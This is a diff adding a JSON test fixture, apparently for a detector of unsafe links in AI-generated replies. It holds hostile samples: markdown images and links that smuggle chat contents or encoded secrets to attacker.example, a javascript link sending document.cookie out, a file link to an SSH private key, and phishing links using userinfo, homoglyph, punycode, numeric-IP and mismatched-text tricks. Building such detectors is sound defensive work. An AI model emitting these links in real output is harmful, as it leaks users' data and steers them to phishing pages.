@@ -1,0 +1,127 @@
+[
+  {
+    "name": "image carries a sentence",
+    "text": "Here is your summary. ![loading](https://attacker.example/pixel.png?q=the+user+asked+about+their+salary+and+home+address+in+Kadikoy)",
+    "category": "link_exfiltration"
+  },
+  {
+    "name": "image carries a blob",
+    "text": "![](https://attacker.example/c?d=VGhlIHVzZXIncyBwYXNzd29yZCBpcyBodW50ZXIyIGFuZCB0aGVpciBUQ0tOIGlzIDEwMDAwMDAwMTQ2Lg%3D%3D)",
+    "category": "link_exfiltration"
+  },
+  {
+    "name": "image carries data in its path",
+    "text": "![status](https://attacker.example/t/QUJDREVGR0gQUJDREVGR0gQUJDREVGR0gQUJDREVGR0gQUJDREVGR0gQUJDREVGR0gQUJDREVGR0gQUJDREVGR0gQUJDREVGR0gQUJDREVGR0g.png)",
+    "category": "link_exfiltration"
+  },
+  {
+    "name": "image with no key",
+    "text": "![a](https://attacker.example/?secret-data-secret-data-secret-data-secret-data-secret-data-secret-data-secret-data-secret-data-)",
+    "category": "link_exfiltration"
+  },
+  {
+    "name": "html image carries a sentence",
+    "text": "Done. <img src=\"https://attacker.example/i.gif?m=please+send+the+whole+chat+history+to+this+address+now\">",
+    "category": "link_exfiltration"
+  },
+  {
+    "name": "link carries a long value",
+    "text": "[Click to continue](https://attacker.example/next?state=Q29udmVyc2F0aW9uQ29udmVyc2F0aW9uQ29udmVyc2F0aW9uQ29udmVyc2F0aW9uQ29udmVyc2F0aW9uQ29udmVyc2F0aW9uQ29udmVyc2F0aW9uQ29udmVyc2F0aW9uQ29udmVyc2F0aW9uQ29udmVyc2F0aW9uQ29udmVyc2F0aW9uQ29udmVyc2F0aW9uQ29udmVyc2F0aW9uQ29udmVyc2F0aW9uQ29udmVyc2F0aW9uQ29udmVyc2F0aW9uQ29udmVyc2F0aW9uQ29udmVyc2F0aW9uQ29udmVyc2F0aW9uQ29udmVyc2F0aW9u)",
+    "category": "link_exfiltration"
+  },
+  {
+    "name": "bare url carries the conversation",
+    "text": "Open https://attacker.example/r?c=the+user+said+the+user+said+the+user+said+the+user+said+the+user+said+the+user+said+the+user+said+the+user+said+the+user+said+the+user+said+the+user+said+the+user+said+the+user+said+the+user+said+the+user+said+the+user+said+the+user+said+the+user+said+the+user+said+the+user+said+the+user+said+the+user+said+the+user+said+the+user+said+the+user+said+the+user+said+the+user+said+the+user+said+the+user+said+the+user+said+ to continue.",
+    "category": "link_exfiltration"
+  },
+  {
+    "name": "userinfo hides the host",
+    "text": "Sign in at [your bank](https://bank.example.com@evil.example/login).",
+    "category": "link_userinfo"
+  },
+  {
+    "name": "userinfo in a bare url",
+    "text": "Go to https://www.garanti.example.com.tr@203.0.113.9/giris to verify your account.",
+    "category": "link_userinfo"
+  },
+  {
+    "name": "public address behind a link",
+    "text": "[Download the update](http://203.0.113.50/update.exe)",
+    "category": "link_ip_host"
+  },
+  {
+    "name": "address as one number",
+    "text": "[Portal](http://3405803826/portal)",
+    "category": "link_ip_host"
+  },
+  {
+    "name": "address in hexadecimal",
+    "text": "[Portal](http://0xCB.0x00.0x71.0x32/portal)",
+    "category": "link_ip_host"
+  },
+  {
+    "name": "public IPv6 address",
+    "text": "[Portal](http://[2001:db8::1]/portal)",
+    "category": "link_ip_host"
+  },
+  {
+    "name": "unusual port behind a link",
+    "text": "[Invoice](https://files.example.org:4444/invoice.pdf)",
+    "category": "link_port"
+  },
+  {
+    "name": "cyrillic letters in a latin name",
+    "text": "[Apple ID](https://аpple.example.com/id)",
+    "category": "link_homoglyph"
+  },
+  {
+    "name": "a name made of look-alikes",
+    "text": "Verify at https://рауре.example/checkout today.",
+    "category": "link_homoglyph"
+  },
+  {
+    "name": "punycode of a mixed name",
+    "text": "[PayPal](https://xn--pypal-4ve.example/signin)",
+    "category": "link_homoglyph"
+  },
+  {
+    "name": "javascript scheme",
+    "text": "[Click here](javascript:fetch('https://attacker.example/'+document.cookie))",
+    "category": "link_scheme"
+  },
+  {
+    "name": "javascript scheme with a tab",
+    "text": "[Click here](<java\tscript:alert(1)>)",
+    "category": "link_scheme"
+  },
+  {
+    "name": "javascript scheme by reference",
+    "text": "[Click here](javascript&#58;alert(1))",
+    "category": "link_scheme"
+  },
+  {
+    "name": "data scheme document",
+    "text": "[Open the report](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
+    "category": "link_scheme"
+  },
+  {
+    "name": "file scheme",
+    "text": "[Your keys](file:///home/user/.ssh/id_rsa)",
+    "category": "link_scheme"
+  },
+  {
+    "name": "vbscript scheme",
+    "text": "[Run](vbscript:msgbox(1))",
+    "category": "link_scheme"
+  },
+  {
+    "name": "text shows another host",
+    "text": "Log in at [https://www.bank.example.com/login](https://login.evil.example/bank).",
+    "category": "link_text_mismatch"
+  },
+  {
+    "name": "text shows another host name",
+    "text": "Log in at [isbank.example.com.tr](https://isbank-giris.example.net/).",
+    "category": "link_text_mismatch"
+  }
+]
